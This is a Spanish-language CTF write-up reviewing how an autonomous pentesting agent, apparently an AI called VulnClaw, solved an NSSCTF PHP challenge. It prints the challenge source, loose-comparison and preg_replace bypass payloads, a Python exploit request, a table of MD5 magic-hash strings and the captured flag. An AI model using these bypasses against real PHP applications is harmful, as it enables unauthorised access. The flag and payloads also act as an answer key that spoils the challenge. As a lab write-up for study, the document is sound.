# 🦞 War Story #002 — NSSCTF Comparación débil de PHP + doble escritura en preg_replace + comparación débil de MD5

## Metainformación

| Campo | Valor |
|------|------|
| **Fecha** | 2026-04-19 |
| **Objetivo** | `http://node5.anna.nssctf.cn:29058/` |
| **Tipo de reto** | Web — Comparación débil de PHP / bypass de doble escritura en preg_replace / colisión de comparación débil MD5 |
| **Palabras clave** | PHP, comparación débil, bypass de array, bypass de doble escritura, colisión MD5 0e, notación científica |
| **Rondas de VulnClaw** | 61 (aproximadamente 52 rondas efectivas para resolver, incluyendo 9 rondas de verificación redundante) |
| **Herramientas MCP** | fetch, python_execute |
| **Flag correcta** | `NSSCTF{4dd0e8c8-d64c-4fe9-90a7-6944df79a1f2}` |

---

## Cadena de ataque (flujo real completo)

| Paso | Acción | Hallazgo/Problema |
|------|------|-----------|
| 1 | Primer inicio del pentesting autónomo | **Error en los parámetros de llamada a herramientas** — la Ronda 2 falló con un 400 por un formato JSON incorrecto en los argumentos de la función |
| 2 | Reinicio | fetch obtuvo el código fuente vía `highlight_file`, pero las etiquetas de coloreado HTML dificultaron la lectura |
| 3 | Análisis inicial del código fuente | Se identificó una estructura de tres niveles: L1 (comparación débil de num) / L2 (preg_replace de str) / L3 (comparación débil de md5) |
| 4 | Intento L1: `num=1e9` | ✅ ¡Correcto! Notación científica que bypassea strlen≤3 + valor numérico>999999999 |
| 5 | Intento L2: `str=NSSNSSCTFCTF` | ✅ ¡Bypass de doble escritura! La corrección P0 anterior surtió efecto, se aplicó de inmediato el conocimiento de bypass de doble escritura |
| 6 | Análisis de la condición L3 | `md5(md5_1)==md5(md5_2)` — se necesita una colisión de comparación débil de MD5 |
| 7-9 | **Búsqueda repetida de valores de colisión MD5** | Dirección de búsqueda confusa: primero se buscó "colisión de doble MD5" → luego "colisión que empieza con 0e" → fuerza bruta → múltiples timeouts |
| 10 | Búsqueda por fuerza bruta con python_execute de md5 que empiecen con 0e | Se encontraron `100523`/`100662`, etc., pero los valores md5 contenían caracteres no numéricos (como `0e993d...`) |
| 11 | Envío de L3: `md5_1=100523&md5_2=100662` | ❌ Devolvió `G100523\n100662` — **¡falló la comparación md5!** |
| 12 | Análisis del error | El valor md5 `0e993dffb...` contiene letras `d`/`f`, por lo que PHP no lo trata como notación científica |
| 13-20 | **Búsqueda continua de valores de colisión correctos** | Se probó búsqueda web, fuerza bruta en Python, pares de colisión conocidos — múltiples timeouts/sin resultados |
| 21-24 | Intento de bypass de array PHP para L3 | `md5_1[]=1&md5_2[]=2` — `md5([])` devuelve NULL → `Nice!X(` — falla la verificación is_string |
| 25-33 | **Búsqueda continua de colisiones de cadenas utilizables** | Se amplió el rango de búsqueda, pero aún no se encontraba una colisión md5 en formato puro `0e[0-9]+` |
| 34 | Construcción de una solicitud completa con python_execute | Apareció `Nice!yoxi!` a la vez — se confirmó que el valor de colisión md5 era válido, pero había problemas de gestión de sesión |
| 35-40 | **Período de gestión de sesión caótica** | Se probó requests.Session / solicitudes por pasos / una sola solicitud — verificación repetida de la flag |
| 41 | Se encontraron los valores de colisión correctos | `QNKCDZO` (md5=0e830400...) y `s878926199a` (md5=0e545993...) — **formato puro 0e+números** |
| 42-48 | Construcción y verificación de la solicitud completa | Uso de Python session para gestionar correctamente las cookies, se obtuvo la flag con éxito |
| 49-61 | **Período de verificación repetida** | Múltiples reenvíos de solicitudes para confirmar la flag — 9 rondas de verificación redundante |

---

## Análisis del código fuente

### Código fuente completo

```php
<?php
session_start();
highlight_file(__FILE__);
if(isset($_GET['num'])){
    if(strlen($_GET['num'])<=3&&$_GET['num']>999999999){
        echo ":D";
        $_SESSION['L1'] = 1;
    }else{ echo ":C"; }
}
if(isset($_GET['str'])){
    $str = preg_replace('/NSSCTF/',"",$_GET['str']);
    if($str === "NSSCTF"){
        echo "wow";
        $_SESSION['L2'] = 1;
    }else{ echo $str; }
}
if(isset($_POST['md5_1'])&&isset($_POST['md5_2'])){
    if($_POST['md5_1']!==$_POST['md5_2']&&md5($_POST['md5_1'])==md5($_POST['md5_2'])){
        echo "Nice!";
        if(isset($_POST['md5_1'])&&isset($_POST['md5_2'])){
            if(is_string($_POST['md5_1'])&&is_string($_POST['md5_2'])){
                echo "yoxi!";
                $_SESSION['L3'] = 1;
            }else{ echo "X("; }
        }
    }else{ echo "G"; }
}
if(isset($_SESSION['L1'])&&isset($_SESSION['L2'])&&isset($_SESSION['L3'])){
    include('flag.php');
    echo $flag;
}
?>
```

### Análisis de los tres niveles

| Nivel | Parámetro | Condición | Método de bypass | Marca de éxito |
|------|------|------|----------|----------|
| L1 | `num` (GET) | `strlen(num)<=3 && num>999999999` | Notación científica `1e9` | `:D` |
| L2 | `str` (GET) | `preg_replace('/NSSCTF/','',str)==="NSSCTF"` | Doble escritura `NSSNSSCTFCTF` | `wow` |
| L3 | `md5_1/md5_2` (POST) | `md5_1!==md5_2 && md5(md5_1)==md5(md5_2) && is_string` | Colisión MD5 que empieza con 0e | `Nice!yoxi!` |
| Flag | — | `L1 && L2 && L3` todas las sesiones establecidas | — | `NSSCTF{...}` |

---

## Payload correcto y su principio

### Solicitud completa

```python
import requests
s = requests.Session()

# Paso 1: establecer sesión L1 + L2
r1 = s.get("http://target/?num=1e9&str=NSSNSSCTFCTF")
# r1.text contiene ":Dwow"

# Paso 2: disparar L3 + obtener la flag
r2 = s.post("http://target/", data={"md5_1": "QNKCDZO", "md5_2": "s878926199a"})
# r2.text contiene "Nice!yoxi!" + flag
```

### L1: Bypass con notación científica

```
GET ?num=1e9
```

- `strlen("1e9")` = 3 (longitud de la cadena) ≤ 3 ✅
- `"1e9" > 999999999` → PHP convierte `"1e9"` en `1000000000` > `999999999` ✅

### L2: Bypass de doble escritura en preg_replace

```
GET ?str=NSSNSSCTFCTF
```

- `preg_replace('/NSSCTF/', '', 'NSSNSSCTFCTF')` → elimina el `NSSCTF` intermedio → `NSS` + `CTF` = `NSSCTF`
- `'NSSCTF' === 'NSSCTF'` ✅

### L3: Colisión de comparación débil de MD5

```
POST md5_1=QNKCDZO&md5_2=s878926199a
```

- `md5("QNKCDZO")` = `0e830400451993494058024219903391`
- `md5("s878926199a")` = `0e545993274517709034328855841020`
- La comparación débil de PHP `"0e830400..." == "0e545993..."` → ambos se interpretan como notación científica `0` → `0 == 0` = `true` ✅
- `"QNKCDZO" !== "s878926199a"` ✅
- `is_string("QNKCDZO") && is_string("s878926199a")` ✅

### ⚠️ La trampa clave de L3: después de "0e" debe haber solo números

- ❌ `100523` → md5 = `0e993dffb88165eb32369e16dd25b536` → contiene letras `d`/`f` → PHP no lo trata como notación científica → **falla la comparación débil**
- ✅ `QNKCDZO` → md5 = `0e830400451993494058024219903391` → después de "0e" solo hay números → PHP lo trata como notación científica 0 → **la comparación débil tiene éxito**

---

## Análisis de problemas del flujo de VulnClaw

### Problema de eficiencia: solo ~15 de 61 rondas fueron efectivas

| Tipo de problema | Rondas desperdiciadas | Causa raíz |
|----------|----------|------|
| Error de formato en los parámetros de llamada a herramientas | 1 | Problema de formato JSON en los parámetros de llamada de herramientas MCP |
| Dirección de búsqueda errónea para el valor de colisión MD5 | ~12 | Primero se buscó "doble MD5" → luego "colisión por fuerza bruta" → timeouts repetidos |
| Comprensión imprecisa del formato de colisión 0e | ~5 | No se sabía que después de "0e" debía haber solo números; se usaron valores md5 con letras |
| Gestión de sesión caótica | ~8 | No se entendía que había que mantener la cookie con solicitudes por pasos, se probó repetidamente con la misma solicitud |
| Verificación repetida | ~9 | Después de obtener la flag se enviaron 9 rondas más de solicitudes repetidas de confirmación |
| **Rondas efectivas** | **~15** | Con conocimiento completo y una sesión correcta, bastarían 5-8 rondas |

### Lista detallada de problemas

#### 1. Conocimiento impreciso de la comparación débil de MD5 (la mayor fuente de desperdicio)

VulnClaw sabía que "los md5 que empiezan con 0e son iguales en comparación débil", pero no sabía que **después de "0e" debe haber solo números (0-9)** para que PHP lo trate como notación científica.

- Se usó `100523` (md5 = `0e993d...`, contiene letras d/f) → PHP no lo trata como notación científica → falla la comparación débil
- Se desperdiciaron 5+ rondas en valores de colisión incorrectos

**Mejora sugerida**: dejar explícito en php-bypass-cheatsheet.md y WAF_BYPASS_KNOWLEDGE que después de "0e" debe haber solo números

#### 2. Estrategia de búsqueda de valores de colisión ineficiente

Camino de búsqueda confuso:
1. Primero se buscó "colisión de doble MD5" (entendiendo la condición como `md5(md5(x))==md5(md5(y))`) → comprensión errónea de la condición
2. Búsqueda por fuerza bruta de números aleatorios → los valores md5 encontrados contenían letras
3. Búsqueda web → timeout

**Camino correcto**: la condición del reto es `md5(x) == md5(y)` (comparación débil), no doble MD5. Se debería usar directamente cadenas de colisión clásicas conocidas como `QNKCDZO`/`240610708`/`s878926199a`, etc.

**Mejora sugerida**: agregar en ctf-web SKILL.md una "tabla de cadenas de colisión estándar para comparación débil de MD5" (con valores ya verificados)

#### 3. Poca conciencia de gestión de sesión

- El reto usa `$_SESSION` para guardar el estado de L1/L2/L3 → hay que mantener la cookie
- VulnClaw intentó enviar todos los parámetros en una sola solicitud → a veces funcionaba, a veces no
- Se desperdiciaron muchas rondas depurando "por qué no aparece la flag"

**Mejora sugerida**: cuando la auditoría de código encuentre `$_SESSION`, recordar automáticamente que se necesita gestión de sesión (persistencia de cookie)

#### 4. Verificación repetida excesiva

Después de obtener la flag se enviaron 9 rondas más de solicitudes repetidas. Aunque verificar es un buen hábito, con 1-2 veces basta.

**Mejora sugerida**: después de verificar con éxito la flag, verificar como máximo 1 vez más y luego pasar inmediatamente a [DONE]

---

## Comparación con #001: efecto de la corrección P0

| Elemento corregido | Desempeño en #001 | Desempeño en #002 | Efecto |
|--------|-----------|-----------|------|
| **P0-1: bypass de doble escritura** | No se sabía en absoluto | **Se aplicó de inmediato** `NSSNSSCTFCTF` | ✅ Corrección efectiva |
| **P0-2: semántica de la salida** | Se interpretó erróneamente el eco del else como éxito | Se identificaron correctamente `:D`/`wow`/`Nice!yoxi!` como marcas de éxito | ✅ Corrección efectiva |
| Nuevo problema expuesto | — | Comprensión imprecisa del formato MD5 0e | ❌ Requiere corrección |
| Nuevo problema expuesto | — | Falta de conocimiento de gestión de sesión | ❌ Requiere corrección |

---

## Resumen de la experiencia

### Metodología central

1. **La notación científica es la llave maestra para bypassear comparaciones débiles de PHP** — formatos como `1e9`/`9e9` satisfacen a la vez una cadena corta y un valor numérico grande
2. **Bypass de doble escritura en preg_replace** — `primera mitad de la palabra clave + palabra clave + segunda mitad de la palabra clave`, tras el reemplazo se reconstruye la palabra original
3. **Comparación débil de MD5** — un valor md5 que empieza con `0e` seguido de solo números, PHP lo trata como notación científica 0, y ambos resultan iguales al compararse
4. **⚠️ Después de "0e" debe haber solo números** — `0e830400...` (todo números ✅) vs `0e993d...` (contiene letras ❌)
5. **Los retos con sesión requieren gestión de cookie** — `$_SESSION` de PHP depende de la cookie, se necesitan solicitudes por pasos

### Tabla de cadenas de colisión de comparación débil MD5 conocidas (ya verificadas)

| Cadena | Valor MD5 | ¿Solo números después de 0e? |
|--------|--------|------------|
| `QNKCDZO` | `0e830400451993494058024219903391` | ✅ |
| `240610708` | `0e462097431906509019562988736854` | ✅ |
| `s878926199a` | `0e545993274517709034328855841020` | ✅ |
| `s155964671a` | `0e342768416822451524974117254469` | ✅ |
| `s214587387a` | `0e848204310308006290363795692068` | ✅ |
| `s1091221200a` | `0e940625744785414655937625828514` | ✅ |

### Verificación de capacidades de VulnClaw

| Capacidad | Desempeño | Puntuación |
|------|------|------|
| Reconocimiento del objetivo | Obtención rápida del código fuente, identificación de la estructura de tres niveles | ⭐⭐⭐⭐ |
| Bypass de comparación débil L1 | Notación científica `1e9`, superado en 1 ronda | ⭐⭐⭐⭐⭐ |
| Bypass de doble escritura L2 | Aplicado de inmediato tras la corrección P0 | ⭐⭐⭐⭐⭐ |
| Colisión MD5 L3 | Dirección de búsqueda confusa, comprensión imprecisa del formato 0e | ⭐⭐ |
| Gestión de sesión | Muchas rondas desperdiciadas, sin conciencia de la persistencia de cookie | ⭐⭐ |
| Verificación de la flag | Verificación excesiva, 9 rondas redundantes | ⭐⭐⭐ |

---

## Problemas pendientes de corrección

| Prioridad | Problema | Corrección sugerida |
|--------|------|----------|
| **P0** | Comprensión imprecisa del formato de comparación débil MD5 0e | php-bypass-cheatsheet.md + WAF_BYPASS_KNOWLEDGE deben dejar explícito que después de "0e" debe haber solo números |
| **P0** | Falta la tabla de cadenas de colisión estándar de comparación débil MD5 | Agregar en ctf-web SKILL.md una tabla de colisiones ya verificada |
| **P1** | Falta conocimiento de gestión de sesión | Al encontrar `$_SESSION` en la auditoría de código, recordar automáticamente la gestión de cookie |
| **P2** | Verificación excesiva de la flag | Tras verificar con éxito, confirmar como máximo 1 vez más y luego pasar de inmediato a [DONE] |

---

*Segundo combate de VulnClaw · 2026-04-19 · 61 rondas de pentesting autónomo (~15 rondas efectivas) · corrección de bypass de doble escritura efectiva · búsqueda de colisión MD5 ineficiente 🦞*
